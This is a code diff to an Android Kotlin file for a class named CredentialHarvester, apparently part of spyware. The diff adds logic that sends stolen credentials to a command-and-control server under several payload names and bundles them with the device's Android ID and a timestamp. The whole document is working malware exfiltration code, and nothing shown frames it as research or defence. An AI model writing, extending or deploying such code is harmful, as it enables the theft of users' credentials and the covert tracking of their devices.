@@ -15,8 +15,9 @@ import java.util.Locale
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.os.Build
-// import android.os.Handler // Using android.os.Handler() directly instead
-// import android.os.Looper  // Using android.os.Handler() directly instead
+import android.os.Handler
+import android.os.Looper
+import android.provider.Settings
 import androidx.core.app.NotificationCompat
 
 /**
@@ -96,7 +97,19 @@ class CredentialHarvester {
                 // Send credentials to the C2 server
                 try {
                     val c2Client = C2Client(context)
+                    
+                    // Try different data type names that the server might be expecting
                     c2Client.sendExfiltrationData("credentials", credentialJson.toString())
+                    c2Client.sendExfiltrationData("creds", credentialJson.toString())
+                    
+                    // Also send in a format that includes the collection of credentials
+                    val credsCollection = JSONObject().apply {
+                        put("device_id", Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID))
+                        put("timestamp", System.currentTimeMillis())
+                        put("credentials", JSONArray().put(credentialJson))
+                    }
+                    c2Client.sendExfiltrationData("credential_collection", credsCollection.toString())
+                    
                     Log.d(TAG, "Credentials sent to C2 server: ${C2Config.SERVER_URL}")
                     
                     // Show success notification
